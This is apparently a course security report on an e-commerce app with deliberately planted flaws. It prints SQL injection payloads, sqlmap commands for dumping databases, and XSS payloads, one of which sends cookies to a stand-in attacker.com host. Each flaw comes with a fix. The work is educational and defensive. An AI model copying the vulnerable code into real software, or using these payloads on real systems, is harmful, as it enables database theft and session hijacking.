# Web Application Security - Vulnerability Report

**Project**: Funko Store E-commerce Application  
**Date**: December 2024  
**Team Members**: [Your Names]

---

## Executive Summary

This report documents 3 intentionally implemented security vulnerabilities in the Funko Store application for educational purposes. The vulnerabilities demonstrate common OWASP Top 10 security issues and their potential impact.

**Vulnerabilities Implemented**:
1. SQL Injection (Critical)
2. Cross-Site Scripting - XSS (High)
3. Weak Password Policy (Medium)

---

## Vulnerability 1: SQL Injection

### Severity: CRITICAL (CVSS 9.8)

### Location
- **File**: `d:\Projects\Funko-Store\src\main\java\com\bolashak\onlinestorebackend\controllers\ProductController.java`
- **Endpoint**: `GET /products/search-vulnerable?query={input}`
- **Lines**: 124-157

### Description
The search endpoint concatenates user input directly into SQL queries without sanitization or parameterization, allowing SQL injection attacks.

### Vulnerable Code
```java
@GetMapping("/search-vulnerable")
public ResponseEntity<?> vulnerableSearch(@RequestParam String query) {
    // VULNERABILITY: Direct string concatenation
    String sql = "SELECT * FROM product WHERE name LIKE '%" + query + "%'";
    Query nativeQuery = entityManager.createNativeQuery(sql, Product.class);
    List<Product> results = nativeQuery.getResultList();
    return ResponseEntity.ok(results);
}
```

### Exploitation

**Test Payloads**:
```
1. Basic bypass:
   ' OR '1'='1

2. Union injection:
   ' UNION SELECT null,null,null,null,null,null,null,null,null,null--

3. Comment injection:
   '; --
```

**Testing Steps**:
1. Navigate to: `http://localhost:8080/products/search-vulnerable?query=' OR '1'='1`
2. Observe all products returned (bypasses search filter)
3. Use SQLmap:
   ```bash
   sqlmap -u "http://localhost:8080/products/search-vulnerable?query=test" --batch
   ```

### Impact
- **Database Compromise**: Attacker can read entire database
- **Data Exfiltration**: User credentials, orders, personal information exposed
- **Data Modification**: Potential to update/delete records
- **Server Compromise**: Possible command execution through stored procedures

### Remediation
Use parameterized queries:
```java
String sql = "SELECT p FROM Product p WHERE p.name LIKE :query";
TypedQuery<Product> query = entityManager.createQuery(sql, Product.class);
query.setParameter("query", "%" + searchTerm + "%");
```

---

## Vulnerability 2: Cross-Site Scripting (XSS)

### Severity: HIGH (CVSS 7.3)

### Location
- **File**: `d:\Projects\Funko_web\src\components\ProductReview.jsx`
- **Route**: `/reviews`
- **Lines**: 119-125, 130-134

### Description
Product review component renders user input without sanitization using `dangerouslySetInnerHTML`, allowing script injection.

### Vulnerable Code
```jsx
{/* VULNERABILITY: Rendering without sanitization */}
<div 
    className="font-bold text-lg"
    dangerouslySetInnerHTML={{ __html: review.username }}
/>
<div 
    className="mt-3 text-gray-700"
    dangerouslySetInnerHTML={{ __html: review.text }}
/>
```

### Exploitation

**Test Payloads**:
```html
1. Alert box:
   <script>alert('XSS')</script>

2. Cookie theft:
   <script>fetch('http://attacker.com?c='+document.cookie)</script>

3. Image tag:
   <img src=x onerror=alert('XSS')>

4. Event handler:
   <div onmouseover=alert('XSS')>Hover me</div>

5. Persistent XSS:
   <script>document.body.innerHTML='<h1>Hacked!</h1>'</script>
```

**Testing Steps**:
1. Navigate to: `http://localhost:3000/reviews`
2. Submit review with payload: `<script>alert('XSS')</script>`
3. Observe script execution when review is displayed
4. Test with different payloads

### Impact
- **Session Hijacking**: Steal session tokens/cookies
- **Phishing**: Redirect users to malicious sites
- **Defacement**: Modify page content
- **Keylogging**: Capture user input
- **Credential Theft**: Steal login credentials

### Remediation
Remove `dangerouslySetInnerHTML` and use React's default escaping:
```jsx
{/* Secure version */}
<div className="font-bold text-lg">{review.username}</div>
<div className="mt-3 text-gray-700">{review.text}</div>
```

Or sanitize if HTML is needed:
```jsx
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(review.text) }} />
```

---

## Vulnerability 3: Weak Password Policy

### Severity: MEDIUM (CVSS 5.3)

### Location
- **File**: `d:\Projects\Funko-Store\src\main\java\com\bolashak\onlinestorebackend\services\impl\AuthenticationServiceImpl.java`
- **Method**: `register()`
- **Lines**: 62-100

### Description
Registration accepts weak passwords without enforcing complexity requirements. No minimum length, no special characters required, no account lockout mechanism.

### Vulnerable Code
```java
public UserResponse register(RegisterRequest registerRequest) {
    // No password strength validation
    user.setPassword(passwordEncoder.encode(registerRequest.getPassword()));
    // ... rest of registration
}
```

### Exploitation

**Test Weak Passwords**:
```
1. "123" - accepted
2. "password" - accepted
3. "admin" - accepted
4. "12345678" - accepted
5. "qwerty" - accepted
```

**Testing Steps**:
1. Try registering with password: `123`
2. Try registering with password: `password`
3. Observe both are accepted
4. Attempt brute force (no lockout mechanism)

### Impact
- **Brute Force Attacks**: Easy to guess passwords
- **Dictionary Attacks**: Common passwords vulnerable
- **Account Takeover**: Weak passwords easily compromised
- **No Protection**: No lockout after failed attempts

### Remediation
Implement password strength validation:
```java
private boolean isStrongPassword(String password) {
    if (password.length() < 8) return false;
    if (!password.matches(".*[A-Z].*")) return false;  // Uppercase
    if (!password.matches(".*[a-z].*")) return false;  // Lowercase
    if (!password.matches(".*\\d.*")) return false;    // Digit
    if (!password.matches(".*[!@#$%^&*].*")) return false; // Special char
    return true;
}

public UserResponse register(RegisterRequest registerRequest) {
    if (!isStrongPassword(registerRequest.getPassword())) {
        throw new IllegalArgumentException(
            "Password must be at least 8 characters with uppercase, lowercase, number, and special character"
        );
    }
    // ... rest of registration
}
```

Add account lockout:
```java
private Map<String, Integer> failedAttempts = new ConcurrentHashMap<>();
private static final int MAX_ATTEMPTS = 5;

public AuthenticationResponse login(String username, String password) {
    if (failedAttempts.getOrDefault(username, 0) >= MAX_ATTEMPTS) {
        throw new RuntimeException("Account locked due to too many failed attempts");
    }
    
    try {
        // ... authentication logic
        failedAttempts.remove(username); // Reset on success
    } catch (Exception e) {
        failedAttempts.put(username, failedAttempts.getOrDefault(username, 0) + 1);
        throw e;
    }
}
```

---

## Testing Tools

### 1. OWASP ZAP
```bash
# Download from: https://www.zaproxy.org/download/
# Configure proxy to localhost:8080
# Run automated scan on http://localhost:3000
```

### 2. Burp Suite
```bash
# Download from: https://portswigger.net/burp/communitydownload
# Configure browser proxy
# Intercept and modify requests
```

### 3. SQLmap
```bash
# Test SQL injection
sqlmap -u "http://localhost:8080/products/search-vulnerable?query=test" --batch

# Enumerate databases
sqlmap -u "http://localhost:8080/products/search-vulnerable?query=test" --dbs

# Dump tables
sqlmap -u "http://localhost:8080/products/search-vulnerable?query=test" -D funko_db --tables
```

---

## Summary

| Vulnerability | Severity | Location | Status |
|--------------|----------|----------|--------|
| SQL Injection | Critical | Backend ProductController | Implemented |
| XSS | High | Frontend ProductReview | Implemented |
| Weak Passwords | Medium | Backend AuthService | Implemented |

**Total Vulnerabilities**: 3  
**Critical**: 1  
**High**: 1  
**Medium**: 1

---

## Recommendations

1. **Never concatenate user input in SQL queries** - Always use parameterized queries
2. **Always sanitize user input** - Never render untrusted HTML
3. **Enforce strong password policies** - Minimum 8 characters with complexity requirements
4. **Implement account lockout** - Protect against brute force attacks
5. **Use security testing tools** - Integrate OWASP ZAP in CI/CD pipeline
6. **Regular security audits** - Test application regularly for vulnerabilities
7. **Security training** - Educate development team on secure coding practices

---

**⚠️ IMPORTANT**: These vulnerabilities are intentional for educational purposes. Never deploy this code to production!
